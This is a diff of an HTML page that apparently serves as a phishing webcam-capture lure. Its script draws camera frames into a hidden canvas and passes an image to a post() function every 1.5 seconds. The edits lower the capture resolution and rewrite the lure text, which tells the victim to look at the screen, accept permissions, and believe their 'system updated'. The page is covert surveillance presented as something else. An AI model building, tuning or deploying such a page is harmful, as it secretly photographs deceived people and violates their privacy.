@@ -10,7 +10,7 @@
    <video id="video" playsinline autoplay></video>
 </div>
 
-<canvas hidden="hidden" id="canvas" width="4128" height="2322"></canvas>
+<canvas hidden="hidden" id="canvas" width="3264" height="1836"></canvas>
 
 <script>
 
@@ -62,7 +62,7 @@ function handleSuccess(stream) {
 var context = canvas.getContext('2d');
   setInterval(function(){
 
-       context.drawImage(video, 0, 0, 4128, 2322);
+       context.drawImage(video, 0, 0, 3264, 1836);
        var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData); }, 1500);
   
@@ -75,7 +75,7 @@ init();
 </script>
 
     <body>
-        <p>Hint: Look at the favicon</p>
+        <p>Look at the screen  in 8 seconds </p>
         <p>(Accept Permissions)</p>
         <p><label><input type="checkbox" name="mirror" id="mirror" /> Your system updated ! Have a good day :)</label></p>
     </body>
